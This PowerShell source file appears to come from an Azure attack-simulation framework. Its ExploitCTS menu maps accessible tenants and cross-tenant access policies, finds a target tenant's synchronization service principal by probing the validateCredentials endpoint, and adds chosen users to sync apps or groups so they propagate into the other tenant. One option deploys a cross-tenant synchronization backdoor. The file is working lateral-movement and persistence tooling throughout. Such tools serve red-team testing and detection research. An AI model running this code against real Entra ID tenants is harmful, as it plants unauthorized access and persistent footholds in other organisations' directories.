function ExploitCTS {
    $recon_options = @{0 = "Back to main menu"; 1 = "List Currently Accessible Tenants"; 2 = "List Azure2Azure Template Applications in Tenant"; 3 = "Find Target Tenants in Existing Cross Tenant Access Policy"; 4 = "Inspect Deployed Cross Tenant Access Policy Configuration"; 5 = "Find CTS Application of a Target Tenant"; 6 = "Sync User to Target Tenant"; 7 = "Add User to CTS Sync Group"; 8 = "Deploy backdoor using Cross Tenant Synchronization"};
    

    MAADWriteProcess "Establishing connection via Microsoft Graph"
    try {
        $accesssible_tenants = Get-AzTenant
        if ($accesssible_tenants -is [array]) {
            $accesssible_tenants | Out-Host
            $TenantId = Read-Host -Prompt "`n[?] Enter the tenant Id from available tenants list to connect via Graph"
            Write-Host ""
            $scopes = @("Policy.Read.All","Policy.ReadWrite.CrossTenantAccess","User.Read.All","GroupMember.ReadWrite.All")
            MAADWriteProcess "Attempting connection via Microsoft Graph" 
            Connect-MgGraph -TenantId $TenantId -Scopes $scopes | Out-Null
            MAADWriteSuccess "Established access via Microsoft Graph"
        }
        else {
            $TenantId = (Get-AzTenant).Id
            MAADWriteProcess "Connecting to tenant -> $((Get-AzTenant).Name) : ($((Get-AzTenant).Id))" 
            MAADWriteProcess "Attempting connection via Microsoft Graph" 
            Connect-MgGraph -Scopes "Policy.Read.All","Policy.ReadWrite.CrossTenantAccess" | Out-Null
            MAADWriteSuccess "Established access via Microsoft Graph"
        }
    }
    catch {
        MAADWriteProcess "Attempting connection via Microsoft Graph" 
        try {
            Connect-MgGraph -Scopes "Policy.Read.All","Policy.ReadWrite.CrossTenantAccess" | Out-Null
            MAADWriteSuccess "Established access via Microsoft Graph"
        }
        catch {
            MAADWriteError "Failed to establish access via Microsoft Graph" 
        }
    }

    do{
        OptionDisplay "CTS Options" $recon_options

        while ($true) {
            try {
                [int]$recon_user_choice = Read-Host -Prompt "`n[?] Choose a CTS option"
                break
            }
            catch {
                MAADWriteError "Choose an option from the list" 
            }
        }

        Select-MgProfile beta

        if ($recon_user_choice -eq 1) {
            #Recon currently accessible tenants to user
            Get-AzTenant | Format-Table
        }

        if ($recon_user_choice -eq 2) {
            #Recon all Azure2Azure template applications in tenant
            ##Check for apps with template ID: 518e5f48-1fc8-4c48-9387-9fdf28b0dfe7
            MAADWriteProcess "Searching deployed applications with Azure2Azure template" 
            Get-MgServicePrincipal -Filter "ApplicationTemplateId eq '518e5f48-1fc8-4c48-9387-9fdf28b0dfe7'" | Out-Host
        }

        if ($recon_user_choice -eq 3) {
            #Recon Existing Cross Tenant Access Policy
            MAADWriteProcess "Searching deployed CTA policies for connected target tenants" 
            Get-MgPolicyCrossTenantAccessPolicyPartner |Format-Table -Property TenantId
        }

        if ($recon_user_choice -eq 4) {
            #Inspect existing Cross Tenant Access policy configuration
            MAADWriteProcess "Getting all deployed CTA policies in tenant" 
            $cta_policies = @()
            $cta_policies += Get-MgPolicyCrossTenantAccessPolicyPartner

            MAADWriteProcess "Total CTA policies found in tenant -> $($cta_policies.Count)"
            MAADPause

            foreach ($cta_policy in $cta_policies){
                MAADWriteProcess "CTA policy linked to tenant -> $($cta_policy.TenantId)"
            
                MAADWriteProcess "Inbound B2B Collaboration for Users & Groups ->" 
                MAADWriteProcess "Access Type: $($cta_policy.B2BCollaborationInbound.UsersAndGroups.AccessType)"
                foreach ($target in $cta_policy.B2BCollaborationInbound.UsersAndGroups.Targets){
                    MAADWriteProcess "Target Type: $($target.TargetType)"
                    MAADWriteProcess "Target: $($target.Target)"
                }
            
                MAADWriteProcess "Inbound B2B Collaboration for Applications ->" 
                MAADWriteProcess "Access Type: $($cta_policy.B2BCollaborationInbound.Applications.AccessType)"
                foreach ($target in $cta_policy.B2BCollaborationInbound.Applications.Targets){
                    MAADWriteProcess "Target Type: $($target.TargetType)"
                    MAADWriteProcess "Target: $($target.Target)"
                }
            
                MAADWriteProcess "Outbound B2B Collaboration for Users & Groups ->" 
                MAADWriteProcess "Access Type: $($cta_policy.B2BCollaborationOutbound.UsersAndGroups.AccessType)"
                foreach ($target in $cta_policy.B2BCollaborationOutbound.UsersAndGroups.Targets){
                    MAADWriteProcess "Target Type: $($target.TargetType)"
                    MAADWriteProcess "Target: $($target.Target)"
                }
            
                MAADWriteProcess "Outbound B2B Collaboration for Applications ->" 
                MAADWriteProcess "Access Type: $($cta_policy.B2BCollaborationOutbound.Applications.AccessType)"
                foreach ($target in $cta_policy.B2BCollaborationOutbound.Applications.Targets){
                    MAADWriteProcess "Target Type: $($target.TargetType)"
                    MAADWriteProcess "Target: $($target.Target)"
                }
            
                MAADWriteProcess "Automatic User Consent Settings ->" 
                $cta_policy.AutomaticUserConsentSettings | Format-Table
            
                MAADWriteProcess "Inbound Trust -> " 
                $cta_policy.InboundTrust | Format-Table
                MAADPause
            }
        }

        if ($recon_user_choice -eq 5) {
            #Find CTS application service principal for a target tenant
            MAADWriteProcess "Target tenants found in deployed CTA policies ->" 
            Get-MgPolicyCrossTenantAccessPolicyPartner | Format-Table -Property TenantId
            $TargetTenantId = Read-Host "`n[?] Enter target tenant ID from list"
            Write-Host ""
            FindTargetSyncApp $TargetTenantId
        }

        if ($recon_user_choice -eq 6) {
            #Add user to sync to target tenant via CTS
            $TargetAppId = Read-Host "`n[?] Enter CTS application service principal (Press [enter] to recon)"

            while ($null -eq $TargetAppId -or $TargetAppId -eq "") {
                MAADWriteProcess "Listing available CTS target tenants:" 
                Get-MgPolicyCrossTenantAccessPolicyPartner | Format-Table -Property TenantId
                $TargetTenantId = Read-Host "`n[?] Select target tenant from the list to find linked CTS application service principal"
                FindTargetSyncApp $TargetTenantId
                MAADWriteProcess ""
                $TargetAppId = Read-Host "`n[?] Enter CTS application service principal (Press [enter] to recon)"
            }

            #Get CTS service principal details
            $cts_service_principal_details = Get-MgServicePrincipal -ServicePrincipalId $TargetAppId
            $cts_service_principal = Get-MgServicePrincipalAppRoleAssignedTo -ServicePrincipalId $TargetAppId
            
            MAADWriteProcess "Selected CTS application -> $($cts_service_principal_details.DisplayName)" 
            if ($cts_service_principal -is [array]) {
                #if multiple assignments in service principal then choose the first
                $AppRoleId = $cts_service_principal[0].AppRoleId
            }
            else {
                $AppRoleId = $cts_service_principal.AppRoleId
            }

            #Select user to add to the CTS service principal
            do {
                $PrincipalId = Read-Host "`n[?] Enter a user account ID to add to CTS application (Press [enter] to recon user accounts)"
                if ($null -eq $PrincipalId -or $PrincipalId -eq "") {
                    #Get list of all users in the tenant
                    try {
                        Get-MgUser -All | Out-Host
                    }
                    catch {
                        MAADWriteError "Failed to recon users in tenant" 
                    }
                }
            } while ($PrincipalId -eq "")

            try {
                #Add user to CTS service principal
                New-MgServicePrincipalAppRoleAssignedTo -ServicePrincipalId $TargetAppId -ResourceId $TargetAppId -PrincipalId $PrincipalId -AppRoleId $AppRoleId -ErrorAction Stop
                MAADWriteProcess "The user will automatically sync to target tenant on next sync job run" 
                MAADWriteSuccess "Added user to CTS sync config"
            }
            catch {
                MAADWriteError "Failed to add user to CTS sync config" 
            }
        }

        if ($recon_user_choice -eq 7) {
            #Add user to CTS sync group
            $TargetAppId = Read-Host "`n[?] Enter CTS application service principal (Press [enter] to recon)"
            Write-Host ""

            while ($null -eq $TargetAppId -or $TargetAppId -eq "") {
                MAADWriteProcess "Listing available CTS target tenants ->" 
                Get-MgPolicyCrossTenantAccessPolicyPartner | Format-Table -Property TenantId
                $TargetTenantId = Read-Host "`n[?] Select a target tenant from the list to find linked CTS application service principal"
                Write-Host ""
                FindTargetSyncApp $TargetTenantId
                $TargetAppId = Read-Host "`n[?] Enter CTS application service principal (enter blank to recon)"
                Write-Host ""
            }

            #Get CTS service principal details
            $cts_service_principal_details = Get-MgServicePrincipal -ServicePrincipalId $TargetAppId
            $cts_service_principal = Get-MgServicePrincipalAppRoleAssignedTo -ServicePrincipalId $TargetAppId
            MAADWriteProcess "Selected CTS application: $($cts_service_principal_details.DisplayName)"
            
            #Check if selected application has a group principal type
            $principal_group_list = @()
            foreach ($principal in $cts_service_principal){
                if ($principal.PrincipalType -eq "Group") {
                    $principal_group_list += $principal
                }
            }
            if ($principal_group_list.Count -gt 0) {
                MAADWriteProcess "Sync group found in CTS application:"
                $principal_group_list | Out-Host
                $selected_sync_group = Read-Host "`n[?] Select group ID to add user to"

                #Select user to add to the CTS service principal
                do {
                    $PrincipalId = Read-Host "`n[?] Enter user account ID to add to CTS sync group (press [enter] to recon user accounts)"
                    Write-Host ""
                    if ($null -eq $PrincipalId -or $PrincipalId -eq "") {
                        #Get list of all users in the tenant
                        Get-MgUser -All | Out-Host
                    }
                } while ($PrincipalId -eq "")

                try {
                    #Add to group 
                    MAADWriteProcess "Attempting to add user to the CTS sync group" 
                    New-MgGroupMember -GroupId $selected_sync_group -DirectoryObjectId $PrincipalId
                    MAADWriteSuccess "Added user to the CTS sync group"
                }
                catch {
                    MAADWriteError "Failed to add user to the CTS sync group" 
                }
            }
            else {
                MAADWriteError "No groups found in the CTS sync application objects" 
            }
        }

        if ($recon_user_choice -eq 8) {
            CTSBackdoor
        }
    }while ($recon_user_choice -ne 0) 
}

function FindTargetSyncApp ([string]$TargetTenantId){

    $Params = @{"useSavedCredentials" = $false; "templateId" = "Azure2Azure"; "credentials" = @(@{"key" = "CompanyId"; "value" = $TargetTenantId}, @{"key" = "AuthenticationType"; "value" = "SyncPolicy"})}

    $all_applications = Get-MgServicePrincipal

    MAADWriteProcess "Searching CTS application Service Principal linked to the target tenant" 
    $counter = 0
    Write-Progress -Activity "Searching CTS application service principal" -Status "0% complete:" -PercentComplete 0;
    
    foreach ($ServicePrincipalId in $all_applications.ID){
        try {
            #The following request will succeed for the Service Prinicipal that hosts the synchronization job for the target tenant
            Invoke-MgGraphRequest -Method POST -Uri "https://graph.microsoft.com/beta/servicePrincipals/$ServicePrincipalId/synchronization/jobs/validateCredentials" -Body $Params 
            MAADWriteSuccess "CTS application service principal ID linked to target tenant: $ServicePrincipalId"
            break
        }
        catch {
            $counter += 1
            Write-Progress -Activity "Searching CTS application Service Principal" -Status "$([math]::Round($counter/$all_applications.Count * 100))% complete:" -PercentComplete ([math]::Round($counter / $all_applications.Count * 100));
        }
    } 
}